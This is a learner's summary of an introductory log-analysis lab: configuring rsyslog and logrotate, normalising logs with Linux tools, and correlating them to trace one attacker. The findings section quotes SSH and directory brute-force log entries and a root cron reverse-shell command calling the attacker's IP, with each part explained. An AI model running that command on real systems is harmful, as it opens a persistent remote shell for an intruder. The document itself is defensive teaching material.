# Intro to Logs – Summary

## Overview
In this room, I explored **logs** as a historical record of system activity, and how they are used to detect, investigate and respond to malicious activity.

The room was built around a scenario: a web server of **SwiftSpend Financial** (`WEBSRV-02`) was constantly being scanned by an adversary. As the system administrator (user `damianhall`, with limited sudo privileges), my task was to configure logging, manage the collected logs, and analyse them to understand what the adversary was doing.

A single log entry may look insignificant, but once logs are collected, normalised and correlated across sources, they become a powerful investigation tool.

---

## What Is a Log?
A log is a record of an event within a system. A typical log entry contains:
- A **timestamp** of when the event was logged
- The **system or application** that generated it
- The **type of event**
- **Additional details**, such as the user or the IP address involved

When logs are aggregated and cross-referenced, they help answer the key questions of an investigation:
- What happened?
- When did it happen?
- Where did it happen?
- Who is responsible?
- Were their actions successful?
- What was the result?

---

## Log Types
Common log types I was introduced to:
- **Application Logs** – status, errors and warnings of specific applications
- **Audit Logs** – activities related to regulatory compliance
- **Security Logs** – logins, permission changes, firewall activity
- **Server Logs** – system, event, error and access logs of a server
- **System Logs** – kernel activity, boot sequences, hardware status
- **Network Logs** – network traffic and connections
- **Database Logs** – queries and updates
- **Web Server Logs** – requests, URLs and response codes

---

## Log Formats
A log format defines how the data in a log file is structured. There are three main categories:

### Semi-structured
Predictable fields combined with free-form text.
- **Syslog** – the standard format for Linux system logs
- **Windows Event Log (EVTX)** – Microsoft's proprietary format

### Structured
Strict, standardised formats that are easy to parse.
- **CSV / TSV** – field-delimited tabular data
- **JSON** – key-value format, easy to use in code
- **W3C Extended Log Format (ELF)** – used by Microsoft IIS
- **XML** – flexible, tag-based format

### Unstructured
Free-form text, rich in context but harder to parse systematically.
- **NCSA Common Log Format (CLF)** – Apache's default
- **NCSA Combined Log Format** – CLF plus referrer and User-Agent, Nginx's default

---

## Log Standards
Log standards define how logs should be generated, transmitted and stored. Examples:
- **Common Event Expression (CEE)** – by MITRE
- **OWASP Logging Cheat Sheet** – security logging for developers
- **Syslog Protocol**
- **NIST SP 800-92** – guide to security log management
- Cloud provider guidelines (Azure, Google Cloud, Oracle Cloud)

---

## Log Collection

### Time Synchronisation (NTP)
For logs to form a correct timeline, all systems must agree on the time. This is done with the **Network Time Protocol (NTP)**.

```
ntpdate pool.ntp.org
```
- `ntpdate` queries a time server once and corrects the local clock
- `pool.ntp.org` is a pool of public time servers

The output shows which server answered, and the **offset** (how far off the local clock was). Servers typically run in **UTC**, so logs from different machines share the same clock.

> `ntpdate` is considered outdated; modern systems sync automatically in the background (`systemd-timesyncd` / `chrony`), and `timedatectl` shows the sync status.

### Collection Steps
1. **Identify sources** – servers, databases, applications, network devices
2. **Choose a log collector**
3. **Configure collection parameters** – including NTP and what to log
4. **Test collection**

### Practical: rsyslog
**rsyslog** is the Linux service that receives log messages and decides where to write them.

Checking the service:
```
sudo systemctl status rsyslog
```
`Active: active (running)` means it is installed and running. Press `q` to exit the output.

rsyslog reads its main config, `/etc/rsyslog.conf`, and also every `.conf` file in `/etc/rsyslog.d/`. Adding a separate file there keeps custom rules isolated, easy to remove, and safe from being overwritten by package updates.

I created `/etc/rsyslog.d/98-websrv-02-sshd.conf`:
```
$FileCreateMode 0644
:programname, isequal, "sshd" /var/log/websrv-02/rsyslog_sshd.log
```
- `$FileCreateMode 0644` – new log files are created as read/write for the owner and read-only for everyone else
- `:programname, isequal, "sshd"` – a **filter**: match messages sent by the program `sshd`
- `/var/log/websrv-02/rsyslog_sshd.log` – the **action**: write matching messages to this file

Every rsyslog rule is built from a **filter** and an **action**.

**Why `98`?** Files are loaded in alphabetical order. The default rules live in `50-default.conf`, so a higher number makes the custom rule load after them. sshd messages still go to `/var/log/auth.log` as before, *in addition* to the new file.

Applying and testing:
```
sudo systemctl restart rsyslog
ssh localhost
cat /var/log/websrv-02/rsyslog_sshd.log
```
`restart` only restarts the rsyslog service (not the machine), so it re-reads its config files. `ssh localhost` generates a fresh sshd message so the file gets created.

> Tip: in newer OpenSSH versions some messages are logged as `sshd-session`, which `isequal, "sshd"` would miss. `startswith, "sshd"` catches both.

### Log Forwarding to a SIEM
The existing cron config, `/etc/rsyslog.d/99-websrv-02-cron.conf`, contained a forwarding rule:
```
:programname, isequal, "CRON" /var/log/websrv-02/rsyslog_cron.log
# Forward Logs to SIEM-02:51514
# *.* @10.10.10.101:51514
```
- `@` forwards over **UDP**, `@@` over **TCP**
- `10.10.10.101:51514` – the IP and port of **SIEM-02**
- The forwarding line is commented out (`#`), so it is not active

---

## Log Management and Centralisation
**Management** means storing logs securely, organising them, backing them up and reviewing them regularly.

**Centralisation** means sending logs from all sources to one system (such as Splunk or the Elastic Stack), which enables real-time monitoring, alerts and integration with incident management.

---

## Log Storage, Retention and Deletion

### Storage
Choosing where to store logs depends on security requirements, accessibility, capacity, cost, compliance, retention policies and disaster recovery.

### Retention
- **Hot storage** – last 3–6 months, near real-time queries
- **Warm storage** – 6 months to 2 years, accessible but slower
- **Cold storage** – 2–5 years, archived and compressed, used for retroactive analysis

### Deletion
Deletion keeps logs manageable, keeps costs in check, and supports privacy regulations such as **GDPR**. Logs should be backed up before deletion.

### Practical: logrotate
**logrotate** automates rotation: the current log is renamed and compressed, older copies shift up by one number, a new empty log is started, and copies beyond the limit are deleted.

I created `/etc/logrotate.d/98-websrv-02_sshd.conf`:
```
/var/log/websrv-02/rsyslog_sshd.log {
    daily
    rotate 30
    compress
    lastaction
        ...
    endscript
}
```
- `daily` – rotation frequency (`hourly` / `daily` / `weekly` / `monthly` / `yearly`)
- `rotate 30` – keep 30 old copies
- `compress` – gzip old copies (`.gz`)
- `lastaction ... endscript` – a bash script that runs once after rotation

The script calculates a **SHA-256 hash** for each compressed copy and saves the results to `hashes_<date>_rsyslog_sshd.txt`. If even one character in a log changes, its hash changes completely, so the hashes prove the logs were not tampered with. This matters when logs are used as evidence. The script ends by restarting rsyslog so it writes to the new file instead of the renamed one.

Running it manually:
```
sudo logrotate -f /etc/logrotate.d/98-websrv-02_sshd.conf
```
`-f` forces rotation now instead of waiting for the schedule.

The existing cron config (`99-websrv-02_cron.conf`) used `hourly` and `rotate 24`.

> Note: the number of `.gz` files in the folder shows how many rotations happened so far, not how many will be kept. The limit is the value of `rotate`.

> Weakness: the hash file is stored next to the logs, so an attacker with root access could change both. In practice, hashes or logs are sent to a separate system such as a SIEM.

---

## Log Analysis

### The Log Analysis Process
- **Data Sources** – the systems that generate logs
- **Parsing** – breaking log entries into components
- **Normalisation** – bringing parsed data from different sources into one standard format
- **Sorting** – ordering by time, source, severity, etc.
- **Classification** – assigning categories, such as severity or event type
- **Enrichment** – adding context, such as geolocation, threat intelligence or data from other sources
- **Correlation** – linking related records across sources
- **Visualisation** – charts, graphs and heat maps
- **Reporting** – structured summaries for stakeholders

### Analysis Techniques
Pattern recognition, anomaly detection, correlation analysis, timeline analysis, machine learning, visualisation and statistical analysis.

### Tools
- **SIEM** – Splunk, Elastic for complex analysis
- **Linux command line** – `cat`, `grep`, `sed`, `sort`, `uniq`, `awk`, `sha256sum` for fast analysis during incident response
- **Windows** – EZ-Tools and `Get-FileHash`

### Practical: Raw Logs in a Log Viewer
I opened four raw logs in an open-source Log Viewer (port `8111`):
- `/var/log/gitlab/nginx/access.log`
- `/var/log/websrv-02/rsyslog_cron.log`
- `/var/log/websrv-02/rsyslog_sshd.log`
- `/var/log/gitlab/gitlab-rails/api_json.log`

`%2F` in the URL is the URL-encoded form of `/`.

The cron log showed the error **"No date field"** when filtering. Its syslog timestamp (`Oct 12 20:17:01`) has no year or timezone, so the tool could not recognise it as a date. This is exactly why normalisation is needed.

### Practical: Parsed and Consolidated Log
Each source uses a different timestamp format:

| Log | Timestamp |
|---|---|
| nginx | `[12/Oct/2026:15:07:08 +0000]` |
| cron, sshd | `Oct 12 15:07:08` |
| api_json | `2026-10-12T15:07:08Z` |

Using Linux tools, all four logs were converted into one file with a unified format:
```
[12/Oct/2026:15:07:08] --- <source log> --- "<original line>"
```

**sed** (Stream EDitor) treats each line as text and is used mainly for find-and-replace:
```
sed "s/ +0000//g"
```
This removes the timezone from the nginx timestamps.

**awk** splits each line into fields (`$1`, `$2`, ..., `$0` = whole line) and rebuilds it in a new format. `-F` sets the field separator, e.g. `-F'[][]'` splits on square brackets. For api_json, `substr`, `mktime` and `strftime` convert the ISO timestamp into the same format.

Then:
```
grep "34.253.159.159" /tmp/parsed_consolidated.log > /tmp/filtered_consolidated.log
sort /tmp/parsed_consolidated.log > /tmp/sort_parsed_consolidated.log
uniq /tmp/sort_parsed_consolidated.log > /tmp/uniq_sort_parsed_consolidated.log
```
- `grep` – keep only lines from the adversary's IP
- `sort` – order lines by the timestamp at the start of each line
- `uniq` – remove duplicate adjacent lines (which is why it runs after `sort`)

> Limitations I noticed: the cron/sshd commands hardcode the year `2023`, and `sort` compares text, not dates, so `[12/Oct/...]` sorts before `[14/Aug/...]`. A format like `2026-10-12 15:07:08` would sort correctly as plain text.

---

## Investigation Findings
All the malicious activity traced back to one IP: **`34.253.159.159`**.

### 1. SSH Brute Force (`rsyslog_sshd.log`)
```
sshd[5868]: Connection closed by invalid user stansimon 34.253.159.159 port 54734 [preauth]
sshd[5868]: PAM 1 more authentication failure; ... rhost=34.253.159.159
```
- Repeated login attempts for the non-existent user **`stansimon`**
- Many attempts in the same second, each with a different PID and source port, which indicates an automated tool
- `[preauth]` – the connection closed before authentication succeeded

### 2. Directory Brute Force (nginx `access.log`)
```
34.253.159.159 - - [12/Oct/2026:20:06:34 +0000] "GET /calling HTTP/1.0" 302 102 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
```
- Requests for alphabetical paths from a wordlist (`/add`, `/add_cart`, `/addfav`, `/cam`, `/campaign`...)
- Several requests per second
- `HTTP/1.0` and a fake User-Agent (IE 6 on Windows XP), typical of scanning tools
- `302` – GitLab redirected unauthenticated requests to the login page

### 3. Persistence via Cron Reverse Shell (`rsyslog_cron.log`)
```
CRON[18615]: (root) CMD (/bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1")
```
A **reverse shell** running as **root every minute**:
- `/bin/bash -i` – an interactive shell
- `/dev/tcp/34.253.159.159/9999` – bash opens a TCP connection to the attacker on port 9999
- `>&` – sends output and errors to the connection
- `0>&1` – takes input from the same connection

The server connects *out* to the attacker, which usually bypasses firewalls that block incoming connections. Because cron re-runs it every minute, the attacker regains access even after a disconnect or a password change.

### The Full Picture
Correlating the three sources tells one story:
1. **Reconnaissance** – scanning the web server for hidden paths
2. **Initial access attempts** – brute forcing SSH credentials
3. **Persistence** – a root cron job that keeps opening a reverse shell

Each log on its own tells only part of the story. Only correlating them reveals the full attack.

### Response Steps
- Block `34.253.159.159` at the firewall
- Find and remove the cron entry (`sudo crontab -l -u root`, `/etc/crontab`, `/etc/cron.d/`)
- Investigate what the attacker did while they had access, and treat the server as fully compromised

---

## Useful Linux Commands
| Command | Purpose |
|---|---|
| `systemctl status / restart <service>` | Check or restart a service |
| `cat <file>` | Print a file |
| `tail -n 20 <file>` | Show the last 20 lines |
| `ls -lsa <dir>` | List files with size, permissions, owner and hidden files |
| `grep "<text>" <file>` | Find matching lines |
| `grep -c` / `grep -o` / `grep -l` | Count matches / print only the match / list matching files |
| `sort \| uniq -c` | Count occurrences of identical lines |
| `sha256sum <file>` | Calculate a file hash |
| `hostname -I` | Show the machine's IP addresses |
| `ss -tlnp` | Show listening TCP ports and their processes |

---

## Lessons From the Practical Work
- The lab VM resets when restarted, so earlier configs and log files were gone. The hostname in the prompt (`ip-10-66-...`) changes with each new machine, which is a quick way to notice.
- `ls` without a path lists the current directory. The `~` in the prompt means the home directory, not `/var/log/websrv-02`.
- rsyslog creates a log file only when the first matching message arrives.
- Inside the VM, `localhost` / `127.0.0.1` can replace the machine IP in URLs.

---

## Key Takeaways
- Logs are a historical record that can reconstruct exactly what an adversary did
- Accurate time (NTP, UTC) is the foundation of a reliable timeline
- Logs must be collected, centralised, rotated and protected with hashes to stay useful and trustworthy
- Different sources use different formats, so normalisation is required before correlation
- Simple Linux tools (`grep`, `awk`, `sed`, `sort`, `uniq`) are powerful for fast analysis during incident response
- Correlating multiple log sources reveals attacks that a single log cannot

---

## Next Steps
Continue to the **Log Operations** room, and later explore SOC and Incident Response tooling such as ELK, Wazuh and Snort.
